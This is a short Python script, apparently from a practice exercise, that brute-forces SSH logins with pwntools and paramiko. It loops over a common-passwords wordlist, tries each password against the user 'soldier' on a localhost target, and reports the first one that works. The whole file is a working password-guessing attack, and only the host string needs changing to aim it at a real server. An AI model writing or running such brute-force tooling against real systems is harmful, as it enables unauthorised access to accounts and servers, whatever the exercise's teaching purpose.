#ssh-brute.py

from pwn import *
import paramiko

host = "127.0.0.1"
username = "soldier"
attempts = 0

with open("ssh-common-passwords.txt","r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting password: '{}!'".format(attempts,password))
			response = ssh(host=host,user=username,password=password, timeout=1) #ssh ftn from pwn lib
			if response.connected():
				print("[>] Valid password found: '{}'".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		attempts+=1